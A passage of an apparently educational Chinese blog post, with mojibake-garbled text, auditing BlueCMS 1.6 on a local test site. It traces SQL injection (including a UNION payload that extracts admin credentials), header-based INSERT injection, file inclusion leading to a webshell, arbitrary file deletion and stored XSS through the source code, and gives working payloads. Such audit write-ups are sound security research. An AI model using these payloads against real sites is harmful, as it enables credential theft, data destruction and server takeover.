class="keyword">as</span> $key=&gt;$val)</span><br><span class="line">&#123;</span><br><span class="line">$str[$key] = deep_addslashes($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$str = addslashes($str);<span class="comment">// </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>addslashes</code>è¿‡æ»¤ï¼Œä½†æ˜¯<code>addslashes</code>å‡½æ•°æ˜¯ä¸å½±å“æ•°å­—å‹æ³¨å…¥çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad = $db-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;ad&#x27;</span>).<span class="string">&quot; WHERE ad_id =&quot;</span>.$ad_id);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„æ˜¯ä¸ªæ•°å­—å‹æ³¨å…¥ï¼Œ<code>getone</code>å‡½æ•°æˆ‘ä»¬è¿½è¸ªä¸€ä¸‹,ä»£ç åœ¨<code>mysql.class.php</code>ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span>(<span class="params">$sql, $type=MYSQL_ASSOC</span>)</span>&#123;</span><br><span class="line">    $query = <span class="keyword">$this</span>-&gt;query($sql,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">    $row = mysql_fetch_array($query, $type);</span><br><span class="line">    <span class="keyword">return</span> $row;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªæ‰§è¡Œsqlè¯­å¥çš„å‡½æ•°ï¼Œè¿™é‡Œå°±ç¡®è®¤å­˜åœ¨æ•°å­—å‹sqlæ³¨å…¥æ¼æ´</p><p>æ¼æ´å¤ç°ï¼šå› ä¸ºæˆ‘ä»¬è¿™é‡Œæ˜¯ç™½ç›’æµ‹è¯•ï¼Œæ‰€ä»¥ç›´æ¥æå–ä¸€ä¸‹ç®¡ç†çš„ç”¨æˆ·åå’Œå¯†ç </p><p><code>http://www.bluecms16.com/ad_js.php?ad_id=1 UNION SELECT 1,2,3,4,5,6,GROUP_CONCAT(admin_name,0x3a,pwd) FROM blue_admin</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228105415027.png" alt="image-20210228105415027"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228110507267.png" alt="image-20210228110507267"></p><blockquote><p>38è¡Œè¾“å‡ºçš„æ—¶å€™æ³¨é‡Šæ‰äº†ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŸ¥çœ‹æºä»£ç </p></blockquote><p>è¿˜è¦æ³¨æ„ä¸€ä¸‹<code>0x3a</code>-&gt;<code>:</code>, å› ä¸ºä¸Šé¢ä½¿ç”¨äº†<code>addslashes</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå°†<code>å•å¼•å·ï¼ˆ&#39;ï¼‰</code>,<code>åŒå¼•å·ï¼ˆ&quot;ï¼‰</code>, <code>åæ–œæ ï¼ˆ\ï¼‰</code>ï¼Œ<code>NULL</code>è¿›è¡Œè½¬ä¹‰ï¼Œè€Œä½¿ç”¨ç¼–ç å°±å¾ˆå¥½çš„ç»•è¿‡äº†ï¼</p><h3 id="INSERTå‹SQLæ³¨å…¥"><a href="#INSERTå‹SQLæ³¨å…¥" class="headerlink" title="INSERTå‹SQLæ³¨å…¥"></a>INSERTå‹SQLæ³¨å…¥</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228111910745.png" alt="image-20210228111910745"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/common.fun.php æ–‡ä»¶108è¡Œ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) </span><br><span class="line">&#123; </span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºç¬¬ä¸€åˆ†æä¸­<code>common.inc.php</code>,åªå¯¹<code>$_POST</code>,<code>$_GET</code>,<code>$_COOKIE</code>,<code>$_REQUEST</code>è¿›è¡Œäº†å¤„ç†ï¼Œä½†æ˜¯é—æ¼äº†<code>$_SERVER</code>,è€Œ<code>getip()</code>å‡½æ•°ä¸­æ°å¥½æ˜¯é€šè¿‡è¯¥å˜é‡è·å–ipåœ°å€ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>client-ip</code>æˆ–<code>x-forwarded-for</code>è¿›è¡Œipçš„ä¼ªé€ ,è§¦å‘æ¼æ´ã€‚</p><p>phpstormä½¿ç”¨<code>ctrl+shift+F</code>æœç´¢ä¸€ä¸‹ï¼Œçœ‹å“ªé‡Œè°ƒç”¨äº†<code>getip()</code>, å¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬è·Ÿè¿›<code>comment.php</code>æ–‡ä»¶114è¡Œ</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228112453867.png" alt="image-20210228112453867"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;INSERT INTO &quot;</span>.table(<span class="string">&#x27;comment&#x27;</span>).<span class="string">&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES (&#x27;&#x27;, &#x27;<span class="subst">$id</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$type</span>&#x27;, &#x27;<span class="subst">$mood</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;&quot;</span>.getip().<span class="string">&quot;&#x27;, &#x27;<span class="subst">$is_check</span>&#x27;)&quot;</span>;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä¹Ÿåˆ†æä¸€ä¸‹å…¶ä»–å˜é‡æ’å…¥ä¼šä¸ä¼šäº§ç”Ÿæ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = !<span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;id&#x27;</span>]) ? intval($_REQUEST[<span class="string">&#x27;id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// intvalå‡½æ•°è¿›è¡Œäº†è½¬ä¹‰</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user_id = $_SESSION[<span class="string">&#x27;user_id&#x27;</span>] ? $_SESSION[<span class="string">&#x27;user_id&#x27;</span>] : <span class="number">0</span>; <span class="comment">// ç•¥</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$mood = intval($_POST[<span class="string">&#x27;mood&#x27;</span>]);</span><br><span class="line"><span class="comment">// intvalå‡½æ•°è¿›è¡Œäº†è½¬ä¹‰</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$content = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;comment&#x27;</span>]) ? htmlspecialchars($_POST[<span class="string">&#x27;comment&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// å¯¹commentå†…å®¹åšäº†htmlè½¬ä¹‰ï¼Œæ‰€ä»¥ä¸å­˜åœ¨xss</span></span><br></pre></td></tr></table></figure><p>çœ‹æ¥æˆ‘ä»¬è¿˜æ˜¯åªèƒ½åˆ©ç”¨<code>getip()</code>æ¥è§¦å‘æ¼æ´</p><p>æ¼æ´å¤ç°ï¼š</p><pre><code>è¿™é‡Œæ˜¯å¯¹è¯„è®ºåŒºè¿›è¡Œçš„sqlæ³¨å…¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ–°å»ºä¸€ç¯‡æ–‡ç« ï¼Œç„¶ååœ¨è¯„è®ºåŒºæµ‹è¯•ï¼ˆç™½ç›’æµ‹è¯•ï¼Œä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘å°†sqlè¯­å¥è¾“å‡ºäº†ï¼‰</code></pre><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228114626452.png" alt="image-20210228114626452"></p><p>poc æ„é€ æ€è·¯å¦‚ä¸‹:</p><blockquote><p> æ’å…¥ä¸¤æ¡æ•°æ®çš„æ€è·¯,è¿›è¡Œæ„é€ ï¼ˆæ³¨å…¥è¿”å›ç»“æœè¦æ˜¾ç¤ºåœ¨ç•™è¨€å†…å®¹å¤„ï¼‰</p></blockquote><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228121059448.png" alt="image-20210228121059448"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228120814610.png" alt="image-20210228120814610"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228120832493.png" alt="image-20210228120832493"></p><h3 id="å¦ä¸€å¤„INSERTå‹æ³¨å…¥"><a href="#å¦ä¸€å¤„INSERTå‹æ³¨å…¥" class="headerlink" title="å¦ä¸€å¤„INSERTå‹æ³¨å…¥"></a>å¦ä¸€å¤„INSERTå‹æ³¨å…¥</h3><p>åœ¨æ–‡ä»¶<code>guest_book.php</code>77è¡Œå¤„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;INSERT INTO &quot;</span> . table(<span class="string">&#x27;guest_book&#x27;</span>) . <span class="string">&quot; (id, rid, user_id, add_time, ip, content) VALUES (&#x27;&#x27;, &#x27;<span class="subst">$rid</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;<span class="subst">$online_ip</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;)&quot;</span>;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ª<code>$online_ip</code>, æˆ‘ä»¬è·Ÿè¸ªä¸€ä¸‹</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228141546498.png" alt="image-20210228141546498"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// include/common.fun.phpæ–‡ä»¶106è¡Œå¤„</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))</span><br><span class="line">   &#123;</span><br><span class="line">      $ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>); </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) </span><br><span class="line">   &#123; <span class="comment">//????????????????????????????ip ???</span></span><br><span class="line">      $ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) </span><br><span class="line">   &#123; </span><br><span class="line">      $ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>))</span><br><span class="line">   &#123;</span><br><span class="line">      $ip = getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>); </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>))</span><br><span class="line">   &#123;</span><br><span class="line">      $ip = getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123; </span><br><span class="line">      $ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸç†è·Ÿä¸Šé¢çš„sqlæ³¨å…¥ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ httpå¤´ï¼ŒåŠ ä¸ª<code>X-FORWARDED-FOR</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228143329923.png" alt="image-20210228143329923"></p><h3 id="æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228121311009.png" alt="image-20210228121311009"></p><p>æ¼æ´å‘ç”Ÿåœ¨<code>user.php</code>æ–‡ä»¶750è¡Œå¤„</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228121416983.png" alt="image-20210228121416983"></p><p><code>$_POST[&#39;pay&#39;]</code>å¹¶æ²¡æœ‰åšå¤šä½™çš„å®‰å…¨æ£€æµ‹ï¼Œè€Œæ˜¯ç›´æ¥è¿›è¡Œæ‹¼æ¥ï¼Œä½†æ˜¯åé¢æœ‰<code>index.php</code>æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„é‡ç‚¹æ˜¯å¦‚ä½•æˆªæ–­ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„é‡ç‚¹æ˜¯å¦‚ä½•æˆªæ–­ã€‚å¦‚æœphpç‰ˆæœ¬ä½äº<code>5.3.4</code>ä¸”<code>magic_quotes_gpc=off</code>åˆ™å¯ä»¥ä½¿ç”¨<code>%00</code>æˆªæ–­ã€‚è¿˜å¯ä»¥ä½¿ç”¨ç³»ç»Ÿæ–‡ä»¶è·¯å¾„é•¿åº¦é™åˆ¶æ¥è¿›è¡Œæˆªæ–­</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ç³»ç»Ÿæ–‡ä»¶è·¯å¾„é•¿åº¦é™åˆ¶æ¥æˆªæ–­ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows <span class="number">259</span>ä¸ªå­—èŠ‚</span><br><span class="line">Linux <span class="number">4096</span>ä¸ªå­—èŠ‚</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228123050851.png" alt="image-20210228123050851"></p><p>å½“ç„¶äº†ï¼Œç”±äºæ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥åŒ…å«å›¾ç‰‡æ–‡ä»¶ï¼ˆä¾‹å¦‚jpgï¼‰ï¼Œè€Œä¸”æœåŠ¡å™¨ä¼šè§£æå›¾ç‰‡æ–‡ä»¶ï¼ˆå½“ä½œphpæ–‡ä»¶æ‰§è¡Œï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå¸¦æœ¨é©¬çš„jpgæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´åŒ…å«æ­¤jpgæ–‡ä»¶ï¼Œæ‹¿webshell</p><p>å…·ä½“åˆ©ç”¨æ­¥éª¤å¦‚ä¸‹:</p><p>åœ¨ä¸ªäººèµ„æ–™ç¼–è¾‘,ä¸Šä¼ å¤´åƒå¤„ä¼ jpgæ–‡ä»¶-&gt; ä½¿ç”¨åŒ…å«æ¼æ´åŒ…å«æ­¤æ–‡ä»¶</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228123614385.png" alt="image-20210228123614385"></p><h3 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228123713404.png" alt="image-20210228123713404"></p><p>æ¼æ´å‘ç”Ÿåœ¨<code>publish.php</code>æ–‡ä»¶309è¡Œå¤„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act == <span class="string">&#x27;del_pic&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"> $id = $_REQUEST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"> $db-&gt;query(<span class="string">&quot;DELETE FROM &quot;</span>.table(<span class="string">&#x27;post_pic&#x27;</span>).<span class="string">&quot; WHERE pic_path=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(file_exists(BLUE_ROOT.$id))</span><br><span class="line"> &#123;</span><br><span class="line"> @unlink(BLUE_ROOT.$id);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬7è¡Œ<code>unlink</code>åˆ é™¤æ–‡ä»¶ï¼Œä¼ å…¥<code>$id</code>ï¼Œå…ˆåˆ é™¤æ•°æ®åº“é‡Œçš„ï¼Œç„¶ååˆ¤æ–­æœ¬åœ°æœ‰æ²¡æœ‰æ­¤æ–‡ä»¶ï¼Œå¦‚æœæœ‰ï¼Œ<code>unlink</code>å‡½æ•°ä¹Ÿå¯¹å…¶è¿›è¡Œåˆ é™¤</p><p>æ¼æ´å¤ç°ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/del.gif" alt="gif1"></p><h3 id="å¦ä¸€å¤„ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#å¦ä¸€å¤„ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="å¦ä¸€å¤„ä»»æ„æ–‡ä»¶åˆ é™¤"></a>å¦ä¸€å¤„ä»»æ„æ–‡ä»¶åˆ é™¤</h3><p>æ¼æ´è§¦å‘åœ¨æ–‡ä»¶<code>user.php</code>ä¸­788è¡Œå¤„</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228133713751.png" alt="image-20210228133713751"></p><p>æœªåšä»»ä½•å¤„ç†ï¼Œç›´æ¥å¯¼è‡´ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</p><p>æ¼æ´å¤ç°:</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/del2.gif" alt="gif2"></p><h3 id="å‘å¸ƒæ–‡ç« å¤„XSS"><a href="#å‘å¸ƒæ–‡ç« å¤„XSS" class="headerlink" title="å‘å¸ƒæ–‡ç« å¤„XSS"></a>å‘å¸ƒæ–‡ç« å¤„XSS</h3><p>åœ¨<code>user.php</code>æ–‡ä»¶ä¸­çš„266è¡Œï¼Œæœ‰ä¸ªå¯¹æ–‡ç« å†…å®¹è¿›è¡Œè¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;content&#x27;</span>]) ? filter_data($_POST[<span class="string">&#x27;content&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›ä¸€ä¸‹<code>filter_data</code>å‡½æ•°,çœ‹å®ƒè¿‡æ»¤äº†ä»€ä¹ˆï¼ˆinclude/common.fun.phpæ–‡ä»¶985è¡Œï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_data</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   $str = preg_replace(<span class="string">&quot;/&lt;(\/?)(script|i?frame|meta|link)(\s*)[^&lt;]*&gt;/&quot;</span>, <span class="string">&quot;&quot;</span>, $str);</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±è¿‡æ»¤äº†å‡ ä¸ªæ ‡ç­¾ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨imgæ ‡ç­¾ç»•è¿‡ï¼š <code>&lt;img src=1 onerror=alert(&#39;Tao&#39;)&gt;</code></p><p>æ¼æ´å¤ç°ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228135019232.png" alt="image-20210228135019232"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228134954595.png" alt="image-20210228134954595"></p><h3 id="ç”¨æˆ·æ³¨å†Œå¤„xss"><a href="#ç”¨æˆ·æ³¨å†Œå¤„xss" class="headerlink" title="ç”¨æˆ·æ³¨å†Œå¤„xss"></a>ç”¨æˆ·æ³¨å†Œå¤„xss</h3><p>åœ¨<code>user.php</code>æ–‡ä»¶ä¸­çš„763è¡Œå¤„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç¼–è¾‘ä¸ªäººèµ„æ–™</span></span><br><span class="line"> <span class="keyword">elseif</span>($act == <span class="string">&#x27;edit_user_info&#x27;</span>)&#123;</span><br><span class="line"> $user_id = intval($_SESSION[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>($user_id))&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line">$birthday = trim($_POST[<span class="string">&#x27;birthday&#x27;</span>]);</span><br><span class="line">$sex = intval($_POST[<span class="string">&#x27;sex&#x27;</span>]);</span><br><span class="line">    $email = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;email&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;email&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $msn = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;msn&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;msn&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $qq = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;qq&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;qq&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $mobile_phone = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;mobile_phone&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;mobile_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $office_phone = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;office_phone&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;office_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $home_phone   = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;home_phone&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;home_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$address = !<span class="keyword">empty</span>($_POST[<span class="string">&#x27;address&#x27;</span>]) ? htmlspecialchars($_POST[<span class="string">&#x27;address&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">     ..............</span><br><span class="line">     ...............</span><br><span class="line">     $sql = <span class="string">&quot;UPDATE &quot;</span>.table(<span class="string">&#x27;user&#x27;</span>).<span class="string">&quot; SET birthday = &#x27;<span class="subst">$birthday</span>&#x27;, sex = &#x27;<span class="subst">$sex</span>&#x27;, face_pic = &#x27;<span class="subst">$face_pic</span>&#x27;, email = &#x27;<span class="subst">$email</span>&#x27;, msn = &#x27;<span class="subst">$msn</span>&#x27;, qq = &#x27;<span class="subst">$qq</span>&#x27;,&quot;</span> .<span class="string">&quot; mobile_phone = &#x27;<span class="subst">$mobile_phone</span>&#x27;, office_phone = &#x27;<span class="subst">$office_phone</span>&#x27;, home_phone = &#x27;<span class="subst">$home_phone</span>&#x27;, address=&#x27;<span class="subst">$address</span>&#x27; WHERE user_id = &quot;</span>.intval($_SESSION[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line">$db-&gt;query($sql);</span><br><span class="line">showmsg(<span class="string">&#x27;æ›´æ–°ä¸ªäººèµ„æ–™æˆåŠŸ&#x27;</span>, <span class="string">&#x27;user.php&#x27;</span>);</span><br></pre></td></tr></table></figure><p><code>$email</code>åªæ˜¯ç»è¿‡äº†<code>trim</code>, å…¶ä½™æœªä½œå¤„ç†ï¼Œå­˜åœ¨xss</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228135739337.png" alt="image-20210228135739337"></p><p>è§‚å¯Ÿè¡¨ç»“æ„ï¼Œ<code>email</code>é•¿åº¦æ˜¯è¶³å¤Ÿå­˜å‚¨äº§ç”Ÿxssä»£ç çš„</p><p>æ¼æ´å¤ç°ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228140258239.png" 